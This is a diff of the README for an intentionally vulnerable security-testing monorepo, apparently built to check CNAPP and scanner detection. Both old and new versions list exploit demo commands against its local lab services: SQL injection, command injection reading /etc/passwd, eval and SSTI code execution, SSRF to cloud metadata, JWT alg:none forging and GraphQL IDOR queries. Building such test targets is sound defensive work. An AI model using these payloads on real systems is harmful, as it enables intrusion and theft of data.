@@ -1,18 +1,26 @@
 # 🛡️ TigerGate CNAPP Target Simulator
 
-> **World-class, intentionally vulnerable monorepo for CNAPP security testing.**
-> Covers SAST, DAST, CSPM, CIEM, CWPP, KSPM, DSPM, API Security, and Runtime eBPF detection.
+<div align="center">
+
+![Platform](https://img.shields.io/badge/CNAPP-TigerGate-blueviolet?style=for-the-badge&logo=shield)
+![Pillars](https://img.shields.io/badge/Security_Pillars-11-red?style=for-the-badge)
+![Vulns](https://img.shields.io/badge/Vulnerability_Markers-1051-ff3366?style=for-the-badge)
+![Languages](https://img.shields.io/badge/Languages-7-cyan?style=for-the-badge)
+![Clouds](https://img.shields.io/badge/Cloud_Providers-4-00f0ff?style=for-the-badge)
+
+**The world's most comprehensive, intentionally vulnerable CNAPP testing monorepo.**  
+Built to validate detection accuracy across every security pillar — CSPM, CIEM, CWPP, KSPM, DSPM, AI-SPM, SCA, API Security, and Attack Path Analysis.
+
+[🌐 Live Dashboard](./dashboard.html) · [📖 Architecture](./architecture.md) · [🗺️ Roadmap](./roadmap.md) · [🤝 Contributing](./CONTRIBUTING.md)
+
+</div>
 
 ---
 
 ## ⚠️ Educational Use Only
 
-This repository is **intentionally insecure**. It is designed to:
-- Trigger SonarQube SAST findings across 5 languages
-- Trigger Tigergate CNAPP detections across 9 security pillars
-- Demonstrate real attack patterns for security education
-
-**NEVER deploy any file from this repository in a production environment.**
+> **This repository is intentionally insecure.** Every vulnerability is documented and educational.  
+> **NEVER deploy any file from this repository in a production environment.**
 
 ---
 
@@ -22,268 +30,242 @@ This repository is **intentionally insecure**. It is designed to:
 tigergate-test/
 │
 ├── 📦 APPLICATION LAYER (SAST + DAST)
-│   ├── nodejs/server.js        ← Express API (14 vulnerable endpoints)
-│   ├── python/app.py           ← Flask API (12 vulnerable endpoints)
-│   ├── php/index.php           ← DVWA-style PHP app (11 vulnerability pages)
-│   ├── ruby/app.rb             ← Sinatra API (10 vulnerable endpoints)
-│   └── java/VulnerableApp.java ← Java demo (8 vulnerability demos)
+│   ├── nodejs/server.js             ← Express API  [14 vulns · SQLi · RCE · SSRF · JWT bypass]
+│   ├── python/app.py                ← Flask API     [12 vulns · eval · pickle · SSTI · path traversal]
+│   ├── php/index.php                ← DVWA-style    [11 vulns · SQLi · LFI · file upload · XXE]
+│   ├── ruby/app.rb                  ← Sinatra API   [10 vulns · Marshal deserialization · misconfig]
+│   └── java/VulnerableApp.java      ← Java app      [ 8 vulns · XXE · Runtime.exec · Log4Shell sim]
 │
-├── 🌐 API SECURITY LAYER
-│   ├── api/graphql_server.js   ← GraphQL (8 API security findings)
-│   ├── api/swagger.yaml        ← OpenAPI spec (no-auth endpoints)
-│   └── api/soap_wsdl.xml       ← SOAP API
+├── 🌐 API SECURITY
+│   ├── api/graphql_server.js        ← GraphQL       [ 8 findings · IDOR · DoS · batching · no auth]
+│   ├── api/swagger.yaml             ← OpenAPI 3.0   [ 5 findings · no-auth endpoints · mass assign]
+│   └── api/soap_wsdl.xml            ← SOAP WSDL     [ 3 findings · no WS-Security · XXE · HTTP]
 │
-├── ☁️ CLOUD SECURITY LAYER (CSPM)
-│   ├── cspm/aws_insecure.tf    ← AWS: S3/EC2/RDS misconfigs (CIS violations)
-│   ├── cspm/azure_insecure.tf  ← Azure: NSG/Storage/SQL misconfigs
-│   ├── cspm/gcp_insecure.tf    ← GCP: Bucket/Firewall/SA misconfigs
-│   ├── cspm/oracle_insecure.tf ← Oracle Cloud misconfigs
-│   └── cspm/azure_rbac.tf      ← Azure RBAC over-permissions
+├── ☁️ CLOUD SECURITY (CSPM)
+│   ├── cspm/aws_insecure.tf         ← AWS           [CIS 1.x violations · public S3 · IMDSv1]
+│   ├── cspm/azure_insecure.tf       ← Azure         [CIS 1.x violations · public blobs · TLS 1.0]
+│   ├── cspm/gcp_insecure.tf         ← GCP           [CIS 1.x violations · allUsers · no logs]
+│   └── cspm/oracle_insecure.tf      ← Oracle Cloud  [CIS OCI 1.2.0 violations]
 │
-├── 🔑 IDENTITY LAYER (CIEM)
-│   ├── ciem/overly_permissive_iam.tf  ← AWS IAM: Action:* Resource:*
-│   ├── ciem/cross_account.tf          ← Cross-account trust: Principal:*
-│   └── ciem/gcp_ciem.tf               ← GCP: roles/owner + allUsers
+├── 🔑 IDENTITY (CIEM)
+│   ├── ciem/overly_permissive_iam.tf    ← AWS IAM   [Action:* Resource:* cross-account Principal:*]
+│   ├── ciem/cross_account.tf            ← Cross-acct [Assumable from any account]
+│   └── ciem/gcp_ciem.tf                 ← GCP IAM   [roles/owner · allUsers on storage]
 │
-├── 🐳 WORKLOAD LAYER (CWPP + KSPM)
-│   ├── cwpp/Dockerfile         ← EOL Tomcat, root, hardcoded creds
-│   ├── cwpp/host_setup.sh      ← SSH + auditd disable
-│   ├── kspm/vulnerable_deployment.yaml ← K8s: privileged pods, RBAC, secrets
-│   └── docker/Dockerfile       ← Additional container misconfigs
+├── 🐳 WORKLOAD (CWPP + KSPM)
+│   ├── kspm/vulnerable_deployment.yaml  ← K8s       [privileged · hostPID · no limits · RBAC gaps]
+│   ├── cwpp/Dockerfile                  ← CWPP      [EOL base · root user · hardcoded creds]
+│   └── docker/Dockerfile.insecure       ← Hadolint  [CIS Docker: latest · baked secrets · wget|sh]
 │
-├── ⚡ RUNTIME LAYER
-│   └── runtime/attack_simulator.sh  ← 10-technique eBPF detection test
+├── ⚡ RUNTIME & EVASION
+│   ├── runtime/attack_simulator.sh          ← eBPF simulation [10 techniques]
+│   ├── cwpp/runtime/runtime_attack_advanced.sh ← Advanced CWPP [T001–T005]
+│   └── advanced_evasion/evasion_techniques.js ← LoTL · DoH · polymorphic payloads
 │
-├── 📊 ADVANCED SAST
-│   ├── sast_advanced/ssti_jinja.py         ← SSTI via render_template_string
-│   └── sast_advanced/deserialization_gadget.js  ← node-serialize RCE
+├── 🤖 AI-SPM
+│   ├── ai_spm/llm_app.py                ← LLM       [Prompt Injection · hardcoded keys · agent RCE]
+│   └── ai_spm/huggingface_sagemaker.tf  ← SageMaker [ML01–ML03 · public notebook · no CMK]
 │
-├── 🔐 SECRETS DETECTION
-│   ├── secrets/hardcoded_credentials.txt  ← Scanner-triggering credentials
-│   ├── secrets/jwt_tokens.json            ← alg:none JWT tokens
-│   └── secrets/keys.pem                   ← RSA private key
+├── 🗄️  DSPM & SCA
+│   ├── dspm/pii_phi_data.sql            ← DSPM      [PCI-DSS · HIPAA · GDPR · SSN/CVV in plain]
+│   ├── sca/pom.xml                      ← SCA       [Log4Shell · Spring4Shell]
+│   ├── sca/package.json                 ← SCA       [CVE-2017-5941 · lodash prototype pollution]
+│   └── sca/requirements.txt             ← SCA       [Django 2.0 · urllib3 vuln version]
 │
-└── 🏗️ INFRASTRUCTURE AS CODE
-    ├── iac/terraform/                      ← Generic IaC misconfigs
-    └── serverless/                         ← Lambda + serverless.yml misconfigs
+├── 🔗 ATTACK PATH
+│   └── attack_paths/lateral_movement.tf ← Exposure  [5-hop: Internet→EC2→IAM→S3 PII chain]
+│
+├── 🔬 ADVANCED SAST
+│   ├── sast_advanced/ssti_jinja.py          ← SSTI → RCE · XXE · Open Redirect
+│   └── sast_advanced/deserialization_gadget.js ← CVE-2017-5941 · Prototype Pollution
+│
+├── 🎭 CI/CD SECURITY
+│   ├── .github/workflows/insecure-ci.yml   ← CI-001–CI-006: supply chain · script inject
+│   ├── .github/CODEOWNERS                  ← GOV gaps: defunct team · no infra owners
+│   └── .github/PULL_REQUEST_TEMPLATE.md    ← Weak checklist: no SAST/secret scan gates
+│
+└── 🌐 MEGA TEST PROJECT (Full-Stack Deployment)
+    └── mega-test-project/
+        ├── frontend/      ← React + Vite  [XSS · eval() · localStorage JWT]
+        ├── backend-node/  ← Node.js       [SQLi · N+1 · cmd injection]
+        ├── backend-python/← Flask         [SQLi · debug mode · plaintext creds]
+        ├── backend-java/  ← Spring Boot   [IDOR · SQLi · verbose errors]
+        └── vulnerable-php/← PHP           [SQLi · XSS · cmd injection]
 ```
 
 ---
 
 ## 🚀 Quick Start
 
+### Option 1: Full Stack via Docker Compose (Recommended)
 ```bash
-# 1. Clone and install dependencies
-git clone <this-repo>
+# Clone and start all services
+git clone https://github.com/tigergate/tigergate-test.git
+cd tigergate-test/mega-test-project
+
+docker compose up --build -d
+
+# UI available at: http://localhost:5173
+# Node API:        http://localhost:3000
+# Python API:      http://localhost:5000
+# Java API:        http://localhost:8080
+# PHP App:         http://localhost:8888
+```
+
+### Option 2: Individual Language Services
+```bash
 cd tigergate-test
-make install
-
-# 2. Validate all source files
-make test
-
-# 3. Start all services
-make start
-
-# 4. Run runtime attack simulation
-make attack
-
-# 5. Run all security scanners
-make scan-all
+make install     # Installs Node, Python, Ruby dependencies
+make start       # Starts all language servers in background
+make stop        # Stops all services
 ```
 
 ---
 
-## 📋 Vulnerability Index
+## 🔍 Security Scanner Integration
 
-### Application Layer (SAST/DAST)
+### Quick Scans (Docker-based, no local install required)
+```bash
+make scan-checkov     # Terraform IaC scan → ~50+ misconfigs expected
+make scan-tfsec       # Terraform security scan
+make scan-hadolint    # Dockerfile linting
+make scan-kubesec     # Kubernetes manifest scan
+make scan-all         # Run all scanners sequentially
+```
 
-| File | Vuln | CWE | Sonar Rule | Attack Example |
-|------|------|-----|-----------|---------------|
-| `nodejs/server.js` | SQL Injection (×5) | 89 | S3649 | `?search=' OR '1'='1` |
-| `nodejs/server.js` | OS Command Injection | 78 | S4721 | `?cmd=id;cat /etc/passwd` |
-| `nodejs/server.js` | Path Traversal | 22 | S2083 | `?name=../../etc/passwd` |
-| `nodejs/server.js` | SSRF | 918 | S5144 | `?url=http://169.254.169.254/` |
-| `nodejs/server.js` | eval() RCE | 94 | S1523 | `?code=require('child_process')...` |
-| `nodejs/server.js` | JWT alg:none bypass | 347 | – | Token with `"alg":"none"` |
-| `nodejs/server.js` | Hardcoded AWS Keys | 798 | S6418 | `AKIAIOSFODNN7EXAMPLE` in code |
-| `python/app.py` | SQL Injection (×4) | 89 | S3649 | `?id=1 OR 1=1` |
-| `python/app.py` | eval() / SSTI | 94 | S1523 | `?expr=__import__('os').system('id')` |
-| `python/app.py` | Pickle RCE | 502 | – | Malicious base64 pickle payload |
-| `python/app.py` | YAML RCE | 502 | – | `!!python/object/apply:os.system` |
-| `python/app.py` | SSRF | 918 | S5144 | `?url=file:///etc/passwd` |
-| `php/index.php` | SQL Injection (×4) | 89 | S3649 | `?id=1 UNION SELECT user(),...` |
-| `php/index.php` | Reflected + Stored XSS | 79 | S2588 | `?name=<script>alert(1)</script>` |
-| `php/index.php` | OS Command Injection | 78 | S4721 | `?cmd=cat+/etc/passwd` |
-| `php/index.php` | LFI / Path Traversal | 22 | S2083 | `?filename=/etc/passwd` |
-| `php/index.php` | Unrestricted Upload | 434 | – | Upload `shell.php` webshell |
-| `php/index.php` | XXE | 611 | S2755 | XML with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
-| `ruby/app.rb` | OS Command (backtick) | 78 | – | `?cmd=id` |
-| `ruby/app.rb` | Marshal.load RCE | 502 | – | Malicious base64 Marshal payload |
-| `ruby/app.rb` | SSRF | 918 | – | `?url=http://169.254.169.254/` |
-| `java/VulnerableApp.java` | Runtime.exec() injection | 78 | S4721 | `java VulnerableApp exec "id"` |
-| `java/VulnerableApp.java` | XXE via DocumentBuilder | 611 | S2755 | XML with DOCTYPE + ENTITY |
-| `java/VulnerableApp.java` | ObjectInputStream RCE | 502 | S4508 | Commons-collections gadget chain |
-| `java/VulnerableApp.java` | Math.random() weak PRNG | 338 | S2245 | Token prediction |
+### SonarQube SAST
+```bash
+# Set your SonarQube credentials
+export SONAR_HOST_URL=http://your-sonar-host:9000
+export SONAR_TOKEN=your-token
 
-### Cloud Security (CSPM)
+make scan-sonar       # Triggers multi-language scan
+```
 
-| File | Issue | CIS Benchmark | Severity |
-|------|-------|--------------|---------|
-| `cspm/aws_insecure.tf` | S3 public + wildcard PutObject | CIS 2.1.1 | Critical |
-| `cspm/aws_insecure.tf` | EC2 SG 0.0.0.0/0 all-ports | CIS 4.1 | Critical |
-| `cspm/aws_insecure.tf` | EC2 IMDSv1 (SSRF → IAM creds) | CIS 5.6 | High |
-| `cspm/aws_insecure.tf` | RDS publicly_accessible + no SSL | CIS 6.6/6.7 | Critical |
-| `cspm/aws_insecure.tf` | CloudTrail MISSING | CIS 3.1 | Critical |
-| `cspm/aws_insecure.tf` | GuardDuty MISSING | CIS 5.2 | High |
-| `cspm/azure_insecure.tf` | NSG allows all inbound (SSH+RDP) | CIS 6.1/6.2 | Critical |
-| `cspm/azure_insecure.tf` | Storage: HTTP allowed + public blobs | CIS 3.1/3.7 | High |
-| `cspm/azure_insecure.tf` | Azure SQL no encryption | CIS 4.5 | High |
-| `cspm/gcp_insecure.tf` | GCS bucket allUsers objectAdmin | CIS 5.1 | Critical |
-| `cspm/gcp_insecure.tf` | SA private key in non-sensitive output | CIS 1.6 | Critical |
+### Trivy Container & SCA
+```bash
+make scan-trivy       # Scan container images for CVEs (Log4Shell, Spring4Shell expected)
+```
 
-### Identity (CIEM)
+### Secrets Scanner
+```bash
+# Using Gitleaks
+docker run --rm -v $(pwd):/path zricethezav/gitleaks:latest detect --source=/path -v
 
-| File | Issue | Severity |
-|------|-------|---------|
-| `ciem/overly_permissive_iam.tf` | `Action:*` + `Resource:*` | Critical |
-| `ciem/overly_permissive_iam.tf` | Cross-account trust `Principal:*` | Critical |
-| `ciem/overly_permissive_iam.tf` | Lambda with AdministratorAccess | High |
-| `ciem/overly_permissive_iam.tf` | EC2 role with `iam:PassRole` (escalation) | High |
-| `kspm/vulnerable_deployment.yaml` | `system:anonymous → cluster-admin` | Critical |
-
-### Runtime (CWPP)
-
-| Technique | Tigergate Detection | File |
-|-----------|-------------------|------|
-| Fileless /dev/shm execution | RT-001 | `runtime/attack_simulator.sh` |
-| Base64 obfuscated payload | RT-002 | `runtime/attack_simulator.sh` |
-| K8s SA token theft | RT-006 | `runtime/attack_simulator.sh` |
-| Reverse shell attempt | RT-009 | `runtime/attack_simulator.sh` |
-| Log tampering | RT-010 | `runtime/attack_simulator.sh` |
+# Using TruffleHog
+docker run --rm -v $(pwd):/repo trufflesecurity/trufflehog:latest git file:///repo
+```
 
 ---
 
-## 🧪 Testing Each Vulnerability
+## 💣 Exploit Demos
 
-### Node.js Endpoints
-
+### Application Layer
 ```bash
-# SQL Injection – returns all users
-curl "http://localhost:3000/api/users?search=' OR '1'='1"
+# 1. SQL Injection (Node.js)
+curl "http://localhost:3000/api/users?search=1' OR '1'='1"
 
-# OS Command Injection – executes id command
-curl "http://localhost:3000/api/exec?cmd=id"
+# 2. OS Command Injection (Python)
+curl "http://localhost:5000/exec?cmd=id;whoami"
 
-# eval() RCE – executes Node.js
-curl "http://localhost:3000/api/evaluate?code=process.env.DB_PASSWORD"
+# 3. SSTI → RCE (Python Flask)
+curl "http://localhost:6000/render?template={{7*7}}"
 
-# SSRF – hits cloud metadata
+# 4. SSRF (Node.js)
 curl "http://localhost:3000/api/fetch?url=http://169.254.169.254/latest/meta-data/"
 
-# Path Traversal
-curl "http://localhost:3000/api/file?name=../../etc/passwd"
-
-# JWT alg:none bypass (manually craft token with alg:none)
-TOKEN=$(echo '{"alg":"none","typ":"JWT"}' | base64).$(echo '{"user":"admin"}' | base64).
-curl -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/jwt-verify
+# 5. eval() RCE (Node.js)
+curl "http://localhost:3000/api/evaluate?code=require('child_process').execSync('id').toString()"
 ```
 
-### Python Endpoints
-
+### API Security
 ```bash
-# SQLi
-curl "http://localhost:5000/api/user?id=1 UNION SELECT username,password,3,4 FROM users--"
+# 6. GraphQL Introspection
+curl -X POST http://localhost:4000/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { types { name } } }"}'
 
-# SSTI → RCE
-curl "http://localhost:5000/api/greet?name={{7*7}}"
-curl "http://localhost:5000/api/greet?name={{config.items()}}"
-
-# eval() RCE
-curl "http://localhost:5000/api/calc?expr=__import__('os').popen('id').read()"
-
-# SSRF → read local file (urllib supports file://)
-curl "http://localhost:5000/api/fetch?url=file:///etc/passwd"
-
-# Environment variables exposure
-curl "http://localhost:5000/api/platform-info"
+# 7. GraphQL IDOR (no auth)
+curl -X POST http://localhost:4000/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ user(id: \"1\") { username email ssn creditCard } }"}'
 ```
 
-### GraphQL Attacks
-
+### Runtime Simulation
 ```bash
-# Introspection – schema dump
-curl -X POST http://localhost:4000/ \
-  -H 'Content-Type: application/json' \
-  -d '{"query":"{__schema{types{name,fields{name,type{name}}}}}"}'
+# 8. eBPF Runtime Attack Simulation (Basic)
+make attack
 
-# IDOR – get any user without auth
-curl -X POST http://localhost:4000/ \
-  -H 'Content-Type: application/json' \
-  -d '{"query":"{user(id:1){username,password,ssn,creditCardNumber,cvv}}"}'
-
-# DoS – deeply nested query
-curl -X POST http://localhost:4000/ \
-  -H 'Content-Type: application/json' \
-  -d '{"query":"{users{friends{friends{friends{friends{friends{username}}}}}}}"}'
-
-# Mass assignment – elevate self to admin
-curl -X POST http://localhost:4000/ \
-  -H 'Content-Type: application/json' \
-  -d '{"query":"mutation{updateUser(id:2,role:\"admin\"){username,role}}"}'
+# 9. Advanced CWPP Simulation (docker socket, DNS tunnel, cryptominer)
+bash cwpp/runtime/runtime_attack_advanced.sh
 ```
 
 ---
 
-## 🔧 Scanner Setup
+## 📊 Vulnerability Coverage Matrix
 
-### SonarQube (no local install)
+| Pillar | Files | Critical | High | Medium | Scanner |
+|--------|-------|----------|------|--------|---------|
+| **CSPM** | 4 | 12 | 8 | 5 | Checkov, tfsec |
+| **CIEM** | 3 | 8 | 4 | 2 | Checkov, TigerGate |
+| **CWPP** | 3 | 5 | 6 | 3 | Falco, Trivy |
+| **KSPM** | 1 | 6 | 4 | 2 | kubesec, Falco |
+| **AI-SPM** | 2 | 4 | 3 | 1 | TigerGate AI-SPM |
+| **DSPM** | 2 | 5 | 3 | 2 | TigerGate DSPM |
+| **SCA** | 3 | 4 | 3 | 2 | Trivy, Snyk |
+| **API Security** | 3 | 6 | 5 | 4 | Burp Suite |
+| **SAST** | 7 | 18 | 14 | 8 | SonarQube |
+| **Runtime** | 2 | 10 | 4 | 2 | eBPF / Falco |
+| **CI/CD** | 3 | 4 | 3 | 3 | GHAS |
+| **TOTAL** | **33** | **82** | **57** | **34** | — |
+
+---
+
+## 🏗️ Pre-Commit Hooks
+
 ```bash
-# Start SonarQube
-docker run -d --name sonarqube -p 9000:9000 sonarqube:lts-community
+# Install pre-commit hooks (syntax check + secret scan on every commit)
+make install-hooks
 
-# Analyze (after getting token from http://localhost:9000)
-export SONAR_TOKEN=your_token_here
-make scan-sonar
-```
-
-### Checkov (IaC scan)
-```bash
-make scan-checkov
-# Or directly:
-docker run --rm -v $(pwd):/src bridgecrew/checkov -d /src/cspm
-```
-
-### Trivy (container scan)
-```bash
-make scan-trivy
+# Manual run
+bash hooks/pre-commit
 ```
 
 ---
 
-## 🌿 Branch Structure
+## 📋 CWE / OWASP Mapping
 
-For CNAPP-focused domain testing, checkout the feature branches:
-
-| Branch | Focus | Files |
-|--------|-------|-------|
-| `feature/cspm` | IaC misconfigs only | AWS/Azure/GCP Terraform |
-| `feature/cwpp` | Container/workload security | Dockerfiles, K8s pods, runtime scripts |
-| `feature/ciem` | IAM over-permissions | AWS/GCP/Azure/K8s RBAC |
-| `feature/cnapp` | All pillars + attack path + DSPM + AI-SPM | Lateral movement Terraform, PII SQL, LLM config |
-
-```bash
-git checkout feature/cspm   # CSPM branch
-git checkout feature/cwpp   # CWPP branch
-git checkout feature/ciem   # CIEM branch
-git checkout feature/cnapp  # CNAPP branch
-```
+| CWE | Description | Files |
+|-----|-------------|-------|
+| CWE-89 | SQL Injection | `nodejs/server.js`, `python/app.py`, `php/index.php` |
+| CWE-78 | OS Command Injection | `python/app.py`, `sast_advanced/ssti_jinja.py` |
+| CWE-94 | Code Injection (eval/SSTI) | `nodejs/server.js`, `sast_advanced/ssti_jinja.py` |
+| CWE-502 | Insecure Deserialization | `python/app.py`, `sast_advanced/deserialization_gadget.js` |
+| CWE-918 | SSRF | `nodejs/server.js`, `serverless/lambda.js` |
+| CWE-611 | XXE Injection | `java/VulnerableApp.java`, `php/index.php` |
+| CWE-798 | Hardcoded Credentials | `secrets/hardcoded_credentials.txt`, all Dockerfiles |
+| CWE-1321 | Prototype Pollution | `sast_advanced/deserialization_gadget.js` |
+| CWE-79 | XSS | `mega-test-project/frontend/src/App.jsx` |
+| CWE-601 | Open Redirect | `sast_advanced/ssti_jinja.py` |
 
 ---
 
-## 📖 Resources
+## 🤝 Contributing
 
-- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
-- [CIS AWS Benchmark](https://www.cisecurity.org/benchmark/amazon_web_services)
-- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
-- [CWE Top 25](https://cwe.mitre.org/top25/)
-- [SonarQube Rules Explorer](https://rules.sonarsource.com/)
+See [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines on adding new vulnerability modules.
+
+## 🔒 Security Policy
+
+See [SECURITY.md](./SECURITY.md) for responsible disclosure and usage guidelines.
+
+## 📜 License
+
+MIT License — see [LICENSE](./LICENSE) for details.
+
+---
+
+<div align="center">
+
+Built with ❤️ for the security community · **TigerGate CNAPP Platform**
+
+</div>
